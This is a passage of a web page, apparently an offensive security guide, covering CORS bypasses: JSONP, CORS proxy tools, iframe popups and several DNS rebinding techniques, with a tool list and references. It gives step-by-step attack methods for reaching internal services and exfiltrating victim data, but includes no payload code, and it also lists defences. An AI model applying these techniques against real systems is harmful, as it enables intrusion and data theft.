<strong>parameter</strong> in the request. Maybe the page was prepared to send the data as JSONP. In that case the page will send back the data with <code class="language-plaintext highlighter-rouge">Content-Type: application/javascript</code> which will bypass the CORS policy.</p> <p><img src="../images/image%20(856).png" alt=""></p> <h3 id="easy-useless-bypass">Easy (useless?) bypass</h3> <p>One way to bypass the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> restriction is by requesting a web application to make a request on your behalf and send back the response. However, in this scenario, the credentials of the final victim won’t be sent as the request is made to a different domain.</p> <ol> <li> <a href="https://github.com/shalvah/cors-escape" rel="external nofollow noopener" target="_blank"><strong>CORS-escape</strong></a>: This tool provides a proxy that forwards your request along with its headers, while also spoofing the Origin header to match the requested domain. This effectively bypasses the CORS policy. Here’s an example usage with XMLHttpRequest:</li> <li> <a href="https://github.com/shalvah/simple-cors-escape" rel="external nofollow noopener" target="_blank"><strong>simple-cors-escape</strong></a>: This tool offers an alternative approach to proxying requests. Instead of passing on your request as-is, the server makes its own request with the specified parameters.</li> </ol> <h3 id="iframe--popup-bypass">Iframe + Popup Bypass</h3> <p>You can <strong>bypass CORS checks</strong> such as <code class="language-plaintext highlighter-rouge">e.origin === window.origin</code> by <strong>creating an iframe</strong> and <strong>from it opening a new window</strong>. More information in the following page:</p> <p>xss-cross-site-scripting/iframes-in-xss-and-csp.md</p> <h3 id="dns-rebinding-via-ttl">DNS Rebinding via TTL</h3> <p>DNS rebinding via TTL is a technique used to bypass certain security measures by manipulating DNS records. Here’s how it works:</p> <ol> <li>The attacker creates a web page and makes the victim access it.</li> <li>The attacker then changes the DNS (IP) of their own domain to point to the victim’s web page.</li> <li>The victim’s browser caches the DNS response, which may have a TTL (Time to Live) value indicating how long the DNS record should be considered valid.</li> <li>When the TTL expires, the victim’s browser makes a new DNS request, allowing the attacker to execute JavaScript code on the victim’s page.</li> <li>By maintaining control over the IP of the victim, the attacker can gather information from the victim without sending any cookies to the victim server.</li> </ol> <p>It’s important to note that browsers have caching mechanisms that may prevent immediate abuse of this technique, even with low TTL values.</p> <p>DNS rebinding can be useful for bypassing explicit IP checks performed by the victim or for scenarios where a user or bot remains on the same page for an extended period, allowing the cache to expire.</p> <p>If you need a quick way to abuse DNS rebinding, you can use services like <a href="https://lock.cmpxchg8b.com/rebinder.html" rel="external nofollow noopener" target="_blank">https://lock.cmpxchg8b.com/rebinder.html</a>.</p> <p>To run your own DNS rebinding server, you can utilize tools like <strong>DNSrebinder</strong> (<a href="https://github.com/mogwailabs/DNSrebinder" rel="external nofollow noopener" target="_blank">https://github.com/mogwailabs/DNSrebinder</a>). This involves exposing your local port 53/udp, creating an A record pointing to it (e.g., ns.example.com), and creating an NS record pointing to the previously created A subdomain (e.g., ns.example.com). Any subdomain of the ns.example.com subdomain will then be resolved by your host.</p> <p>You can also explore a publicly running server at <a href="http://rebind.it/singularity.html" rel="external nofollow noopener" target="_blank">http://rebind.it/singularity.html</a> for further understanding and experimentation.</p> <h3 id="dns-rebinding-via-dns-cache-flooding">DNS Rebinding via <strong>DNS Cache Flooding</strong> </h3> <p>DNS rebinding via DNS cache flooding is another technique used to bypass the caching mechanism of browsers and force a second DNS request. Here’s how it works:</p> <ol> <li>Initially, when the victim makes a DNS request, it is responded with the attacker’s IP address.</li> <li>To bypass the caching defense, the attacker leverages a service worker. The service worker floods the DNS cache, which effectively deletes the cached attacker server name.</li> <li>When the victim’s browser makes a second DNS request, it is now responded with the IP address 127.0.0.1, which typically refers to the localhost.</li> </ol> <p>By flooding the DNS cache with the service worker, the attacker can manipulate the DNS resolution process and force the victim’s browser to make a second request, this time resolving to the attacker’s desired IP address.</p> <h3 id="dns-rebinding-via-cache">DNS Rebinding via <strong>Cache</strong> </h3> <p>Another way to bypass the caching defense is by utilizing multiple IP addresses for the same subdomain in the DNS provider. Here’s how it works:</p> <ol> <li>The attacker sets up two A records (or a single A record with two IPs) for the same subdomain in the DNS provider.</li> <li>When a browser checks for these records, it receives both IP addresses.</li> <li>If the browser decides to use the attacker’s IP address first, the attacker can serve a payload that performs HTTP requests to the same domain.</li> <li>However, once the attacker obtains the victim’s IP address, they stop responding to the victim’s browser.</li> <li>The victim’s browser, upon realizing that the domain is unresponsive, moves on to use the second given IP address.</li> <li>By accessing the second IP address, the browser bypasses the Same Origin Policy (SOP), allowing the attacker to abuse this and gather and exfiltrate information.</li> </ol> <p>This technique leverages the behavior of browsers when multiple IP addresses are provided for a domain. By strategically controlling the responses and manipulating the browser’s choice of IP address, an attacker can exploit the SOP and access information from the victim.</p> <blockquote> <p>[!WARNING] Note that in order to access localhost you should try to rebind <strong>127.0.0.1</strong> in Windows and <strong>0.0.0.0</strong> in linux.<br> Providers such as godaddy or cloudflare didn’t allow me to use the ip 0.0.0.0, but AWS route53 allowed me to create one A record with 2 IPs being one of them “0.0.0.0”</p> <p><img src="../images/image%20(140).png" alt="" data-size="original"></p> </blockquote> <p>For more info you can check <a href="https://unit42.paloaltonetworks.com/dns-rebinding/" rel="external nofollow noopener" target="_blank">https://unit42.paloaltonetworks.com/dns-rebinding/</a></p> <h3 id="other-common-bypasses">Other Common Bypasses</h3> <ul> <li>If <strong>internal IPs aren’t allowed</strong>, they might <strong>forgot forbidding 0.0.0.0</strong> (works on Linux and Mac)</li> <li>If <strong>internal IPs aren’t allowed</strong>, respond with a <strong>CNAME</strong> to <strong>localhost</strong> (works on Linux and Ma</li> <li>If <strong>internal IPs aren’t allowed</strong> as DNS responses, you can respond <strong>CNAMEs to internal services</strong> such as www.corporate.internal.</li> </ul> <h3 id="dns-rebidding-weaponized">DNS Rebidding Weaponized</h3> <p>You can find more information about the previous bypass techniques and how to use the following tool in the talk <a href="https://www.youtube.com/watch?v=y9-0lICNjOQ" rel="external nofollow noopener" target="_blank">Gerald Doussot - State of DNS Rebinding Attacks &amp; Singularity of Origin - DEF CON 27 Conference</a>.</p> <p><a href="https://github.com/nccgroup/singularity" rel="external nofollow noopener" target="_blank"><strong><code class="language-plaintext highlighter-rouge">Singularity of Origin</code></strong></a> is a tool to perform <a href="https://en.wikipedia.org/wiki/DNS_rebinding" rel="external nofollow noopener" target="_blank">DNS rebinding</a> attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine’s IP address and to serve attack payloads to exploit vulnerable software on the target machine.</p> <h3 id="real-protection-against-dns-rebinding">Real Protection against DNS Rebinding</h3> <ul> <li>Use TLS in internal services</li> <li>Request authentication to access data</li> <li>Validate the Host header</li> <li> <a href="https://wicg.github.io/private-network-access/" rel="external nofollow noopener" target="_blank">https://wicg.github.io/private-network-access/</a>: Proposal to always send a pre-flight request when public servers want to access internal servers</li> </ul> <h2 id="tools"><strong>Tools</strong></h2> <p><strong>Fuzz possible misconfigurations in CORS policies</strong></p> <ul> <li><a href="https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8" rel="external nofollow noopener" target="_blank">https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8</a></li> <li><a href="https://github.com/chenjj/CORScanner" rel="external nofollow noopener" target="_blank">https://github.com/chenjj/CORScanner</a></li> <li><a href="https://github.com/lc/theftfuzzer" rel="external nofollow noopener" target="_blank">https://github.com/lc/theftfuzzer</a></li> <li><a href="https://github.com/s0md3v/Corsy" rel="external nofollow noopener" target="_blank">https://github.com/s0md3v/Corsy</a></li> <li><a href="https://github.com/Shivangx01b/CorsMe" rel="external nofollow noopener" target="_blank">https://github.com/Shivangx01b/CorsMe</a></li> <li><a href="https://github.com/omranisecurity/CorsOne" rel="external nofollow noopener" target="_blank">https://github.com/omranisecurity/CorsOne</a></li> </ul> <h2 id="references">References</h2> <ul> <li><a href="https://portswigger.net/web-security/cors" rel="external nofollow noopener" target="_blank">https://portswigger.net/web-security/cors</a></li> <li><a href="https://portswigger.net/web-security/cors/access-control-allow-origin" rel="external nofollow noopener" target="_blank">https://portswigger.net/web-security/cors/access-control-allow-origin</a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" rel="external nofollow noopener" target="_blank">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS</a></li> <li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" rel="external nofollow noopener" target="_blank">https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties</a></li> <li><a href="https://www.codecademy.com/articles/what-is-cors" rel="external nofollow noopener" target="_blank">https://www.codecademy.com/articles/what-is-cors</a></li> <li><a href="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" rel="external nofollow noopener" target="_blank">https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors</a></li> <li><a href="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" rel="external nofollow noopener" target="_blank">https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646</a></li> <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" rel="external nofollow noopener" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration</a></li> <li><a href="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" rel="external nofollow noopener" target="_blank">https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>